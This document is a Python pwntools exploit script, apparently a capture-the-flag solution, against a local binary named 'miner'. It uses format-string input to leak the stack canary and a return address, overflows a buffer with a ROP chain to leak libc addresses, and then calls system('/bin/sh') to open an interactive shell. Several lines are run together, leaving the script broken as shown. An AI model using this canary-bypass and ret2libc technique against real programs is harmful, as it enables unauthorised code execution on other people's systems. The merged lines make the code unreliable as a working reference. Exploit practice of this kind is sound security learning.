from pwn import *
context.terminal = ('xfce4-terminal', '-e')
pty = process.PTY
p = process("./miner", stdin=pty, stdout=pty)
return_address_offset = 0x1494 # Second call to getCommand in main
puts_plt_offset = 0x1050
puts_got_offset = 0x4028
printf_got_offset = 0x4040
ret_offset = 0x1016
endOfGetCommand_offset = 0x13d7
pop_rdi_offset = 0x15cb
pop_r14_r15_offset = 0x15c8
main_offset = 0x13d9
p.readuntil("Will you enter? (yes/no):")
p.sendline("yes%27$p")
p.readuntil("yes")
canary = int(p.recvline(), 16)
p.readuntil("Which way will you go? (right, left, down):")
p.sendline("right%29$p")
p.readuntil("right")
return_address = int(p.recvline(), 16)
print("Canary: " + hex(canary))
print("Return address: " + hex(return_address))
code_base = return_address - return_address_offset
print("Code base: " + hex(code_base))
pop_rdi = p64(code_base + pop_rdi_offset)
pop_r14_r15 = p64(code_base + pop_r14_r15_offset)
main = p64(code_base + main_offset)
puts_plt = p64(code_base + puts_plt_offset)
puts_got = p64(code_base + puts_got_offset)
printf_got = p64(code_base + printf_got_offset)
ret = p64(code_base + ret_offset)
end_of_get_command = code_base + endOfGetCommand_offsetjunk = p64(0xdeadbeef)
sevens = p64(0x700000007)
offset = 104
payload = b"run" + b"A"*(offset-3) + p64(canary) + junk
rop = b""
rop += ret # kill one rop location
rop += pop_r14_r15 + sevens + sevens # overwrite the array with valid
content
# now on with the rop chain
rop += pop_rdi + puts_got + puts_plt
rop += pop_rdi + printf_got + puts_plt
# Need to return somewhere to do this over again...
rop += main
p.sendline(payload + rop)
p.readuntil("You chose")
p.readline()
puts_libc = u64(p.recv(6).ljust(8, b"\x00"))
p.recv(1)
printf_libc = u64(p.recv(6).ljust(8, b"\x00"))
print(hex(puts_libc))
print(hex(printf_libc))
# development machine - adjust for production
offset_system = 0x00000000000488a0
offset_str_bin_sh = 0x1881acoffset_puts = 0x0000000000076030
# production machine
offset_system = 0x0000000000048e20
offset_str_bin_sh = 0x18a143
offset_puts = 0x00000000000765b0
libc_base = puts_libc - offset_puts
system = p64(libc_base + offset_system)
bin_sh = p64(libc_base + offset_str_bin_sh)
p.readuntil("Will you enter? (yes/no):")
p.sendline("yes")
p.readuntil("Which way will you go? (right, left, down):")
p.sendline("right")
p.readuntil("What will you do? (attack, run):")
rop = b""
rop += pop_rdi + bin_sh + system
p.sendline(payload + rop)
p.interactive()